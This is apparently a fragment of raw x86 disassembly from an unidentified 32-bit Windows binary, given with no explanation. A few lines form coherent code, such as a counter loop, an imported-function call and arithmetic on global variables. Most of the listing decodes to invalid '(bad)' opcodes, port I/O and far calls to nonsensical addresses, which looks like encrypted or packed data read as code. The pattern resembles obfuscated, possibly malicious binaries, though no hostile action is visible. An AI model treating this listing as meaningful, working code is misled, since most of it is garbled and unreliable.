  4083b1:	and    DWORD PTR [esp+esi*2],0xcf1cf060
  4083b8:	fadd   QWORD PTR [edi-0x42e259f2]
  4083be:	retf   0x4d0f
  4083c1:	jbe    0x40838f
  4083c3:	jne    0x40834e
  4083c5:	inc    ebp
  4083c6:	loopne 0x408349
  4083c8:	and    eax,0x43365b
  4083cd:	add    BYTE PTR [eax],al
  4083cf:	add    BYTE PTR [eax],al
  4083d1:	mov    eax,ds:0x43365b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43365b,eax
  4083dc:	cmp    DWORD PTR ds:0x43365b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43365b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43365b
  40840c:	inc    eax
  40840d:	mov    ds:0x43365b,eax
  408412:	cmp    DWORD PTR ds:0x43365b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43360b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433613,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433727
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	fwait
  408465:	mov    edi,0xc8e4ac98
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	mov    ah,ch
  408472:	mov    al,0x69
  408474:	xlat   BYTE PTR ds:[ebx]
  408475:	aam    0xed
  408477:	inc    edx
  408478:	scas   eax,DWORD PTR es:[edi]
  408479:	bound  edi,QWORD PTR [ecx+eax*2-0x5461ab5f]
  408480:	jp     0x4084be
  408482:	mov    esi,0xc69d8b6e
  408487:	shr    eax,1
  408489:	jp     0x408437
  40848b:	xchg   edx,eax
  40848c:	lock xchg esi,eax
  40848e:	scas   al,BYTE PTR es:[edi]
  40848f:	fdiv   DWORD PTR [esi+0x3b]
  408492:	out    0x3e,eax
  408494:	std    
  408495:	cmp    al,0x4
  408497:	and    eax,0xf988b4fe
  40849c:	add    BYTE PTR [esi+eax*8-0x33],al
  4084a0:	jle    0x40848c
  4084a2:	and    DWORD PTR [edx+ecx*2],0x947d2938
  4084a9:	push   ecx
  4084aa:	leave  
  4084ab:	imul   edi,DWORD PTR [edx],0xfffffff2
  4084ae:	test   DWORD PTR [ebp-0x80],edi
  4084b1:	into   
  4084b2:	or     DWORD PTR [eax],ebx
  4084b4:	mov    bl,0xbd
  4084b6:	aaa    
  4084b7:	dec    esi
  4084b8:	inc    eax
  4084b9:	xchg   ecx,eax
  4084ba:	dec    esi
  4084bb:	adc    al,0xdb
  4084bd:	lds    esi,FWORD PTR es:[esi]
  4084c0:	enter  0x4544,0x89
  4084c4:	sub    eax,0x9eec6cad
  4084c9:	cmpxchg DWORD PTR [esi-0x3f045b7],eax
  4084d0:	ins    DWORD PTR es:[edi],dx
  4084d1:	and    ah,dh
  4084d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084d4:	(bad)  
  4084d5:	xor    BYTE PTR [eax-0xd7faf27],dh
  4084db:	repnz pop ebp
  4084dd:	mov    ch,0xaa
  4084df:	push   edi
  4084e0:	sbb    BYTE PTR [esi],al
  4084e2:	cld    
  4084e3:	test   al,0x95
  4084e5:	or     DWORD PTR [ebx-0x69],ebx
  4084e8:	ret    
  4084e9:	xor    DWORD PTR [edx-0x4b560ede],esi
  4084ef:	or     eax,0xc2f7d6d4
  4084f4:	dec    ebp
  4084f5:	in     al,dx
  4084f6:	mov    ecx,0xe4ed28c8
  4084fb:	pop    ds
  4084fc:	xlat   BYTE PTR ds:[ebx]
  4084fd:	lds    ecx,FWORD PTR [eax+0x78]
  408500:	dec    ebx
  408501:	sar    DWORD PTR [esi-0x5a11709a],cl
  408507:	imul   DWORD PTR [edx]
  408509:	test   eax,0xac7da3da
  40850e:	xor    ch,BYTE PTR [edi-0x6f9da840]
  408514:	cdq    
  408515:	push   esp
  408516:	add    bl,BYTE PTR [edi]
  408518:	fcomi  st,st(0)
  40851a:	jmp    0x40851d
  40851c:	xchg   esi,eax
  40851d:	rol    BYTE PTR [ebx-0xd206cd4],1
  408523:	mov    eax,0x47faebd9
  408528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408529:	cmp    BYTE PTR [ecx-0x28a718c7],bl
  40852f:	or     al,0x38
  408531:	in     eax,0x62
  408533:	in     eax,dx
  408534:	dec    edx
  408535:	push   es
  408536:	in     al,dx
  408537:	ret    0x91e3
  40853a:	faddp  st(7),st
  40853c:	mov    DWORD PTR [esp+ebp*4-0x3b8501bb],esi
  408543:	ret    0xf622
  408546:	inc    ebx
  408547:	lea    ebx,[ecx+ecx*4-0x21]
  40854b:	mov    ch,0xa4
  40854d:	and    bl,BYTE PTR [eax-0x29b2b709]
  408553:	mov    al,ds:0xf0f30b2d
  408558:	loopne 0x408551
  40855a:	(bad)  
  40855b:	mov    es,eax
  40855d:	xlat   BYTE PTR ds:[ebx]
  40855e:	leave  
  40855f:	jp     0x408581
  408561:	js     0x40855b
  408563:	cmp    BYTE PTR [esi+ebx*4+0x2027a8a0],dh
  40856a:	pop    esp
  40856b:	(bad)  
  40856d:	cmp    DWORD PTR [eax-0x5eba1209],eax
  408573:	xor    ah,dl
  408575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408576:	(bad)  
  408578:	sub    dh,BYTE PTR [eax]
  40857a:	(bad)  
  40857b:	fsub   DWORD PTR [esi]
  40857d:	push   es
  40857e:	repnz dec ebx
  408580:	call   0xde3d:0x362c4649
  408587:	or     BYTE PTR [ebp-0x1a9ad3fb],0xa5
  40858e:	test   al,0x39
  408590:	fistp  WORD PTR [esi-0x288cb8f]
  408596:	xchg   DWORD PTR [edx],ebx
  408598:	mov    ah,0x1d
  40859a:	test   eax,0x3485800e
  40859f:	and    BYTE PTR [ebx+0x68],0x21
  4085a3:	cmp    ebp,DWORD PTR [ebx]
  4085a5:	pop    ecx
  4085a6:	je     0x4085af
  4085a8:	mov    bl,0x67
  4085aa:	pop    esp
  4085ab:	das    
  4085ac:	mov    WORD PTR [ebp+0x69],es
  4085af:	fisubr DWORD PTR [ebx]
  4085b1:	xchg   edi,eax
  4085b2:	cwde   
  4085b3:	fldenv [eax+0x33]
  4085b6:	scas   eax,DWORD PTR es:[edi]
  4085b7:	(bad)  
  4085b8:	out    dx,eax
  4085b9:	aas    
  4085ba:	hlt    
  4085bb:	repz out dx,eax
  4085bd:	mov    al,0x2b
  4085bf:	dec    edi
  4085c0:	push   ecx
  4085c1:	xor    BYTE PTR [eax],dh
  4085c3:	(bad)  
  4085c4:	push   esi
  4085c5:	add    bl,BYTE PTR ds:0x95981d36
  4085cb:	sub    cl,BYTE PTR fs:[eax+edi*4-0x25]
  4085d0:	mov    al,ds:0xf2eb68e4
  4085d5:	adc    eax,0x3d8f4be8
  4085da:	push   0xbfb54dcb
  4085df:	sub    DWORD PTR [edx+0x5a],0x12
  4085e3:	icebp  
  4085e4:	mov    ds:0x865a82d4,eax
  4085e9:	into   
  4085ea:	in     al,dx
  4085eb:	cs pushf 
  4085ed:	mov    dh,0xb9
  4085ef:	outs   dx,BYTE PTR ds:[esi]
  4085f0:	sub    cl,BYTE PTR [edi-0x3f59b80a]
  4085f6:	sbb    cl,BYTE PTR [ebx+eax*2-0x4a]
  4085fa:	stc    
  4085fb:	add    DWORD PTR [ebx+0x15],esi
  4085fe:	in     eax,dx
  4085ff:	xchg   ebp,eax
  408600:	adc    al,0x5b
  408602:	sbb    edx,DWORD PTR [ecx]
  408604:	(bad)  
  408605:	push   ecx
  408606:	retf   
  408607:	lds    ax,DWORD PTR [edi+eiz*8]
  40860b:	inc    esi
  40860c:	xchg   DWORD PTR [edx],edi
  40860e:	in     al,0x42
  408610:	xchg   edx,eax
  408611:	popf   
  408612:	aaa    
  408613:	push   0xffffffcc
  408615:	stos   BYTE PTR es:[edi],al
  408616:	push   0xca252504
  40861b:	test   BYTE PTR [ebx-0x58618d63],bh
  408621:	xor    bl,BYTE PTR [eax+0x202334d1]
  408627:	pop    esp
  408628:	and    DWORD PTR [ebp-0x43],esp
  40862b:	add    edi,DWORD PTR [ebp-0x663af2de]
  408631:	mov    ch,0x75
  408633:	sbb    ecx,ebx
  408635:	fiadd  WORD PTR [edx]
  408637:	sbb    eax,0xbe63c5cf
  40863c:	mov    al,0x71
  40863e:	(bad)  
  40863f:	aam    0x8b
  408641:	and    edx,DWORD PTR [esi]
  408643:	cld    
  408644:	or     eax,0x6149e419
  408649:	call   0xda62:0xa77e051b
  408650:	sub    BYTE PTR [ebx],dl
  408652:	pop    esi
  408653:	adc    edx,DWORD PTR [edx+esi*1+0x4e]
  408657:	ins    BYTE PTR es:[edi],dx
  408658:	sbb    al,0x2e
  40865a:	dec    eax
  40865b:	jb     0x4086b6
  40865d:	aam    0xd3
  40865f:	dec    esp
  408660:	jne    0x4086bc
  408662:	jmp    FWORD PTR [ebp+0x62]
  408665:	pop    es
  408666:	lds    edi,FWORD PTR [esi+esi*8]
  408669:	loop   0x408659
  40866b:	sbb    al,0xf1
  40866d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40866e:	push   eax
  40866f:	xor    edi,ecx
  408671:	lds    ebx,FWORD PTR [esi+0x277ba694]
  408677:	jnp    0x408623
  408679:	(bad)  
  40867a:	(bad)  
  40867b:	mov    eax,0xb79dc18a
  408680:	dec    eax
  408681:	(bad)  
  408683:	jle    0x408625
  408685:	retf   0x68dd
  408688:	int    0x6b
  40868a:	retf   
  40868b:	xchg   esi,eax
  40868c:	add    DWORD PTR [esi-0x67],ecx
  40868f:	(bad)  
  408690:	lock mov ds:0xdec25bd7,eax
  408696:	bswap  ebp
  408698:	mov    bl,0x76
  40869a:	mov    ebx,0x8e12feb8
  40869f:	adc    DWORD PTR ds:0x433663,0x4335fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4336ef,0x433727
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx+0x2bb6004a],ecx
  4086ca:	jo     0x408656
  4086cc:	(bad)  
  4086cd:	jle    0x40874d
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	(bad)
  4086d7:	add    ebx,ecx
  4086d9:	outs   dx,BYTE PTR ds:[esi]
  4086da:	push   esi
  4086db:	pop    esi
  4086dc:	iret   
  4086dd:	mov    ds:0xa24a03c4,al
  4086e2:	mov    bh,0x9f
  4086e4:	jge    0x40873e
  4086e6:	cmp    eax,0x9fe3457e
  4086eb:	mov    ecx,0x3b2a74cc
  4086f0:	mov    ebx,DWORD PTR [esi+0x77]
  4086f3:	into   
  4086f4:	and    ah,BYTE PTR cs:[esi+0x4e]
  4086f8:	push   ds
  4086f9:	ret    
  4086fa:	jp     0x4086d9
  4086fc:	stc    
  4086fd:	xchg   edi,eax
  4086fe:	cmp    BYTE PTR [esi],dl
  408700:	cwde   
  408701:	mov    ds:0x7ae7adf5,al
  408706:	int3   
  408707:	dec    ebp
  408708:	in     al,0x5e
  40870a:	push   esi
  40870b:	in     al,0x57
  40870d:	adc    BYTE PTR [eax+0x9],al
  408710:	inc    eax
  408711:	pop    edi
  408712:	push   cs
  408713:	cmp    ch,BYTE PTR [ebp+0x7d42785a]
  408719:	add    al,0x98
  40871b:	cmp    DWORD PTR [ebx],ebx
  40871d:	daa    
  40871e:	jmp    0xdbb198d8
  408723:	std    
  408724:	sbb    BYTE PTR [esi+0x61],al
  408727:	cmp    ecx,DWORD PTR [edi+edx*4-0x34]
  40872b:	rol    ch,1
  40872d:	clc    
  40872e:	shl    dl,0x1c
  408731:	add    BYTE PTR [ecx+0xfc66044],al
  408737:	enter  0x167a,0x8f
  40873b:	or     BYTE PTR [ebp-0x1e],ch
  40873e:	mul    al
  408740:	sub    eax,0x546d0202
  408745:	retf   0xe7b0
  408748:	xor    BYTE PTR [edx+0x37],bh
  40874b:	xchg   ebp,eax
  40874c:	and    al,BYTE PTR [esi+0xdc01f69]
  408752:	sbb    edi,DWORD PTR [ebp-0x49be5584]
  408758:	cmp    DWORD PTR [ebx+0x2a8f4cf0],esp
  40875e:	loope  0x408783
  408760:	mov    edi,0xe258d787
  408765:	push   cs
  408766:	cmp    eax,0x77ca4edd
  40876b:	xor    ch,BYTE PTR [eax+0x79]
  40876e:	add    eax,0x315559f
  408773:	inc    esi
  408774:	sub    al,0x47
  408776:	ss mov ebx,0xa58cf6ad
  40877c:	lods   eax,DWORD PTR gs:[esi]
  40877e:	in     eax,dx
  40877f:	cmp    al,0x59
  408781:	dec    edx
  408782:	adc    BYTE PTR [ebx+edx*1+0x1a5c9299],ch
  408789:	inc    esi
  40878a:	shl    BYTE PTR [eax-0x50],1
  40878d:	pop    edi
  40878e:	jle    0x4087cb
  408790:	call   0x4d9d62c4
  408795:	repnz aam 0x36
  408798:	push   ebx
  408799:	adc    BYTE PTR [edi],dh
  40879b:	push   0x3867e11f
  4087a0:	fsubr  QWORD PTR [edx-0x23]
  4087a3:	sub    eax,DWORD PTR [ebx]
  4087a5:	pop    es
  4087a6:	pop    ebx
  4087a7:	cli    
  4087a8:	clc    
  4087a9:	in     al,0xc
  4087ab:	(bad)  
  4087ac:	adc    BYTE PTR [esi-0x6b],dl
  4087af:	lea    ecx,[ecx]
  4087b1:	fwait
  4087b2:	js     0x40882d
  4087b4:	ja     0x40881e
  4087b6:	test   ch,dh
  4087b8:	daa    
  4087b9:	fdivr  st,st(2)
  4087bb:	sub    eax,0x6498f83c
  4087c0:	daa    
  4087c1:	mov    cl,0x11
  4087c3:	push   ebp
  4087c4:	ror    BYTE PTR [ebp+ecx*4-0x105da947],0x5
  4087cc:	or     al,0x31
  4087ce:	mov    ebp,0xcdb3dcca
  4087d3:	jae    0x408783
  4087d5:	stc    
  4087d6:	scas   eax,DWORD PTR es:[edi]
  4087d7:	inc    esp
  4087d8:	jnp    0x40878a
  4087da:	sub    eax,0x716ddf3e
  4087df:	stc    
  4087e0:	add    bh,BYTE PTR gs:[ebp-0x65563b09]
  4087e7:	mov    al,ds:0x4cd750f5
  4087ec:	icebp  
  4087ed:	shl    edi,1
  4087ef:	stc    
  4087f0:	stos   DWORD PTR es:[edi],eax
  4087f1:	popa   
  4087f2:	jnp    0x408805
  4087f4:	adc    ebp,ebx
  4087f6:	cwde   
  4087f7:	or     ch,bl
  4087f9:	add    ecx,DWORD PTR [eax]
  4087fb:	pop    edi
  4087fc:	sti    
  4087fd:	and    eax,0x2ff83d6
  408802:	push   esp
  408803:	in     al,0xb8
  408805:	mov    WORD PTR [ecx+0x34627b46],cs
  40880b:	les    ebx,FWORD PTR [eax+esi*1+0x12]
  40880f:	outs   dx,BYTE PTR ds:[esi]
  408810:	sbb    ebp,DWORD PTR [eax]
  408812:	adc    eax,0x44a77ef5
  408817:	les    ax,DWORD PTR [edi]
  40881a:	jbe    0x40880e
  40881c:	imul   ebx,DWORD PTR [esi-0x2f],0x13
  408820:	mov    esp,0x95a43bd6
  408825:	xchg   ebp,eax
  408826:	dec    ecx
  408827:	add    eax,0x86aeab01
  40882c:	(bad)  
  40882d:	pop    esi
  40882e:	ficom  DWORD PTR [edx+ecx*8+0x11]
  408832:	mov    cl,0x81
  408834:	xchg   esi,eax
  408835:	mov    ah,0x44
  408837:	sar    DWORD PTR [edx+0x676f393e],0xe6
  40883e:	movaps XMMWORD PTR [ecx+0x1c],xmm1
  408842:	push   ebx
  408843:	push   edi
  408844:	inc    edi
  408845:	pop    esi
  408846:	retf   0x2987
  408849:	imul   esi,DWORD PTR [edi-0x36],0xffffffb0
  40884d:	stos   BYTE PTR es:[edi],al
  40884e:	scas   al,BYTE PTR es:[edi]
  40884f:	retf   0xd098
  408852:	out    0x39,eax
  408854:	dec    eax
  408855:	dec    eax
  408856:	mov    ecx,0x2a0d2d1
  40885b:	lea    edi,[eax-0x63]
  40885e:	into   
  40885f:	push   edx
  408860:	sti    
  408861:	dec    ecx
  408862:	mov    ?,WORD PTR [edx]
  408864:	push   edi
  408865:	or     ah,BYTE PTR [eax+0x56b125f9]
  40886b:	enter  0xdee1,0x6c
  40886f:	inc    ebp
  408870:	cmp    ch,BYTE PTR [edi-0x5e]
  408873:	dec    esp
  408874:	adc    BYTE PTR [ebx+0x589a816e],cl
  40887a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40887b:	mov    esp,0xa218d243
  408880:	xor    al,0xc8
  408882:	xchg   BYTE PTR [eax],bh
  408884:	sub    DWORD PTR [esi-0x2c],eax
  408887:	pushf  
  408888:	int    0x7a
  40888a:	ins    BYTE PTR es:[edi],dx
  40888b:	iret   
  40888c:	imul   esp,ebp,0x22
  40888f:	pop    ecx
  408890:	pop    ss
  408891:	mov    ecx,0x5d208b65
  408896:	sub    ch,dh
  408898:	lods   al,BYTE PTR ds:[esi]
  408899:	cmp    al,0x36
  40889b:	sbb    bl,BYTE PTR [edx-0x7e]
  40889e:	adc    al,0x55
  4088a0:	adc    dl,BYTE PTR [eax+ecx*4+0x1f]
  4088a4:	xor    DWORD PTR gs:[ebx],edx
  4088a7:	into   
  4088a8:	ret    
  4088a9:	push   0xffffffc9
  4088ab:	pop    ebp
  4088ac:	fidiv  WORD PTR [ebx]
  4088ae:	pop    ecx
  4088af:	lods   al,BYTE PTR ds:[esi]
  4088b0:	nop
  4088b1:	push   0xffffff87
  4088b3:	icebp  
  4088b4:	cs xchg edi,eax
  4088b6:	loop   0x408887
  4088b8:	dec    DWORD PTR [eax-0x5a]
  4088bb:	cmp    dl,BYTE PTR [ecx-0x13b46472]
  4088c1:	dec    esi
  4088c2:	lahf   
  4088c3:	sbb    cl,BYTE PTR [ebx+0x4fd62785]
  4088c9:	mov    edi,0xbe39ad6
  4088ce:	jp     0x40885c
  4088d0:	shl    BYTE PTR [eax+0x47],cl
  4088d3:	or     DWORD PTR [edi-0x73],eax
  4088d6:	and    eax,0x8da52d23
  4088db:	mov    bh,0xe9
  4088dd:	clc    
  4088de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088df:	mov    ecx,0xce2f4003
  4088e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e5:	int    0x79
  4088e7:	(bad)  
  4088e8:	push   0x833b30fd
  4088ed:	mov    edi,0x2e505a35
  4088f2:	or     DWORD PTR [ecx-0x2d],esp
  4088f5:	enter  0xec48,0x20
  4088f9:	popf   
  4088fa:	and    eax,ebx
  4088fc:	or     DWORD PTR [ebx+0x63358100],ecx
  408902:	ss inc ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4336db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433653,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43361f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433727,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x67b4612c
  408968:	push   0x7e7ed4b0
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	jnp    0x4089cc
  408973:	inc    edi
  408974:	(bad)  
  408975:	mov    ecx,0xebd95415
  40897a:	mov    edx,0x196d1e51
  40897f:	push   eax
  408980:	dec    ebp
  408981:	fwait
  408982:	add    ah,BYTE PTR [ecx-0xd]
  408985:	push   ecx
  408986:	and    ecx,DWORD PTR [ecx-0x37]
  408989:	and    ch,0x8
  40898c:	shr    DWORD PTR [esi-0x53d143e2],0x61
  408993:	ficom  WORD PTR [ecx]
  408995:	les    esp,FWORD PTR [edi+0x3df539f7]
  40899b:	rcl    DWORD PTR [ebp-0x6b],cl
  40899e:	(bad)  
  40899f:	mov    ds:0x67e09aa9,al
  4089a4:	js     0x4089ae
  4089a6:	out    0x3e,eax
  4089a8:	scas   eax,DWORD PTR es:[edi]
  4089a9:	pop    ecx
  4089aa:	lea    eax,[esi]
  4089ac:	cs sti 
  4089ae:	sbb    ah,dh
  4089b0:	std    
  4089b1:	jb     0x408984
  4089b3:	cmp    al,dl
  4089b5:	and    BYTE PTR [ebx-0x5611a908],ch
  4089bb:	outs   dx,DWORD PTR ds:[esi]
  4089bc:	(bad)  
  4089bd:	and    ch,ch
  4089bf:	pop    ecx
  4089c0:	mov    ebp,0x7442816b
  4089c5:	jnp    0x408a01
  4089c7:	xor    ecx,DWORD PTR [esi]
  4089c9:	popa   
  4089ca:	push   esi
  4089cb:	cs cdq 
  4089cd:	clc    
  4089ce:	nop
  4089cf:	call   0x89ca:0x532ea496
  4089d6:	inc    ecx
  4089d7:	pop    ss
  4089d8:	push   ebx
  4089d9:	dec    esi
  4089da:	dec    esp
  4089db:	mov    al,BYTE PTR [eax+esi*4-0x5e0b3991]
  4089e2:	pop    ecx
  4089e3:	cmp    al,BYTE PTR [eax]
  4089e5:	jle    0x4089cd
  4089e7:	dec    ecx
  4089e8:	inc    eax
  4089e9:	or     dh,dl
  4089eb:	mov    ds:0xb29c087b,eax
  4089f0:	sbb    bh,al
  4089f2:	or     DWORD PTR [eax-0x80],edx
  4089f5:	hlt    
  4089f6:	push   eax
  4089f7:	loop   0x408a3f
  4089f9:	(bad)  
  4089fa:	adc    al,0x54
  4089fc:	or     eax,eax
  4089fe:	jg     0x408a7d
  408a00:	rcr    dl,cl
  408a02:	inc    esp
  408a03:	aam    0xd1
  408a05:	pop    ebx
  408a06:	loopne 0x4089cf
  408a08:	pop    es
  408a09:	stos   BYTE PTR es:[edi],al
  408a0a:	fld    TBYTE PTR [edi]
  408a0c:	sar    DWORD PTR [esi],1
  408a0e:	into   
  408a0f:	shr    esi,cl
  408a11:	xor    DWORD PTR [edx+0x2da8f04e],esp
  408a17:	lock mov ebp,0xe6c84422
  408a1d:	lods   eax,DWORD PTR ds:[esi]
  408a1e:	loop   0x4089d5
  408a20:	push   edi
  408a21:	test   ah,bh
  408a23:	xor    eax,0x30
  408a26:	inc    esp
  408a27:	push   edi
  408a28:	repz cdq 
  408a2a:	ins    BYTE PTR es:[edi],dx
  408a2b:	cmp    BYTE PTR [esi-0x30],0x26
  408a2f:	cmp    BYTE PTR [edi-0x26],al
  408a32:	xchg   edi,eax
  408a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a34:	and    al,BYTE PTR [edx]
  408a36:	pop    ebx
  408a37:	cwde   
  408a38:	lea    edi,[eax+0x58]
  408a3b:	sahf   
  408a3c:	in     eax,0x6f
  408a3e:	mov    esi,0x461cd3c5
  408a43:	clc    
  408a44:	lods   al,BYTE PTR ds:[esi]
  408a45:	fsubrp st(6),st
  408a47:	pop    ecx
  408a48:	mov    ebp,0x4a45cfe8
  408a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a4e:	mov    al,ch
  408a50:	push   edx
  408a51:	jnp    0x408a26
  408a53:	inc    ebp
  408a54:	imul   eax,DWORD PTR [edx+0x50],0xffffffbd
  408a58:	mov    BYTE PTR [eax+0x3f],ah
  408a5b:	inc    ebx
  408a5c:	inc    ebp
  408a5d:	out    0x6f,eax
  408a5f:	(bad)  
  408a60:	xor    al,0xd
  408a62:	xchg   esi,eax
  408a63:	ret    0xa15
  408a66:	repnz inc esi
  408a68:	or     DWORD PTR [ebx],edx
  408a6a:	xor    al,0x86
  408a6c:	test   eax,0xca49b544
  408a71:	loop   0x408a61
  408a73:	popa   
  408a74:	jl     0x408a8d
  408a76:	sbb    eax,0x9cedd274
  408a7b:	mov    ebx,0xb81f56fb
  408a80:	lock mov edx,edx
  408a83:	lods   al,BYTE PTR ds:[esi]
  408a84:	mov    dl,0xe3
  408a86:	pop    ds
  408a87:	lods   eax,DWORD PTR ds:[esi]
  408a88:	ja     0x408a96
  408a8a:	mov    ebp,0x9280f306
  408a8f:	mov    edx,0x9d91a1d0
  408a94:	(bad)  
  408a95:	mov    esp,DWORD PTR ds:0xb8ae2b16
  408a9b:	mov    ds:0x439b0220,al
  408aa0:	jmp    0x408ad7
  408aa2:	idiv   ebx
  408aa4:	pop    ecx
  408aa5:	test   al,0xed
  408aa7:	mov    al,ds:0x58a88604
  408aac:	add    esi,ebp
  408aae:	pushf  
  408aaf:	or     DWORD PTR ds:0xf774985b,0x4362c248
  408ab9:	je     0x408a7d
  408abb:	in     eax,0xb0
  408abd:	fist   WORD PTR [edi-0x92c54a4]
  408ac3:	in     eax,dx
  408ac4:	imul   eax,DWORD PTR [edi+ebx*1+0x5892ae8],0x93506ae5
  408acf:	pop    edx
  408ad0:	xchg   esp,eax
  408ad1:	mov    DWORD PTR [ebx],esi
  408ad3:	mov    ecx,0xdf9a58a8
  408ad8:	stos   DWORD PTR es:[edi],eax
  408ad9:	ss scas eax,DWORD PTR es:[edi]
  408adb:	pop    ebx
  408adc:	pop    ebp
  408add:	(bad)  
  408ade:	scas   eax,DWORD PTR es:[edi]
  408adf:	jb     0x408aa0
  408ae1:	sahf   
  408ae2:	jae    0x408ab8
  408ae4:	into   
  408ae5:	daa    
  408ae6:	mov    ebp,0xb465d693
  408aeb:	scas   al,BYTE PTR es:[edi]
  408aec:	or     al,BYTE PTR [ecx-0x67]
  408aef:	and    dh,0xd5
  408af2:	rcl    BYTE PTR [eax-0x16],1
  408af5:	fcmovbe st,st(2)
  408af7:	imul   esp,ebx,0x78123870
  408afd:	clc    
  408afe:	out    dx,al
  408aff:	push   esp
  408b00:	rcr    ah,1
  408b02:	and    eax,0xf648f209
  408b07:	shr    DWORD PTR [edx+ecx*8-0xd8d613c],0xaf
  408b0f:	and    eax,0x15936eb0
  408b14:	sbb    dh,BYTE PTR [esi-0xe909e8d]
  408b1a:	(bad)  [esi+0x2a]
  408b1d:	ss cld 
  408b1f:	ins    BYTE PTR es:[edi],dx
  408b20:	loop   0x408b57
  408b22:	popf   
  408b23:	jecxz  0x408abd
  408b25:	push   cs
  408b26:	inc    edx
  408b27:	push   0xffffffdd
  408b29:	pop    esi
  408b2a:	xor    al,0x96
  408b2c:	inc    eax
  408b2d:	test   eax,0x6e3fab45
  408b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b33:	and    al,0x3e
  408b35:	sbb    eax,esi
  408b37:	pop    ecx
  408b38:	int    0x32
  408b3a:	xchg   ebp,eax
  408b3b:	mov    edx,0xcddabc53
  408b40:	je     0x408b71
  408b42:	sub    esi,edx
  408b44:	push   es
  408b45:	sbb    ebp,DWORD PTR [ebp-0x57354a27]
  408b4b:	sub    edx,DWORD PTR [eax-0x39]
  408b4e:	lock xor esp,ebp
  408b51:	push   edx
  408b52:	imul   edx,DWORD PTR [esp+eax*1-0x66],0xffffffa5
  408b57:	push   esp
  408b58:	push   0xffffffab
  408b5a:	ds jp  0x408af0
  408b5d:	inc    esp
  408b5e:	mov    bh,0xde
  408b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b61:	lock clc 
  408b63:	into   
  408b64:	arpl   WORD PTR [ecx+0x4a],cx
  408b67:	mov    edi,0xe2a837ef
  408b6c:	xchg   edx,eax
  408b6d:	jno    0x408bea
  408b6f:	mov    ecx,0xffb6a105
  408b74:	push   0x1c
  408b76:	and    DWORD PTR [esi-0x35],esp
  408b79:	aas    
  408b7a:	mov    bl,ch
  408b7c:	clc    
  408b7d:	sub    ebx,ecx
  408b7f:	mov    eax,0x4a56363f
  408b84:	push   eax
  408b85:	mov    dl,dl
  408b87:	icebp  
  408b88:	scas   al,BYTE PTR es:[edi]
  408b89:	out    0x96,al
  408b8b:	call   FWORD PTR [ebx+0x7f]
  408b8e:	shr    ch,1
  408b90:	pop    eax
  408b91:	inc    esi
  408b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b93:	dec    edi
  408b94:	call   0xed32350f
  408b99:	lock sbb cl,BYTE PTR [edi]
  408b9c:	test   DWORD PTR ds:0x8b000000,ebx
  408ba2:	inc    ebp
  408ba3:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
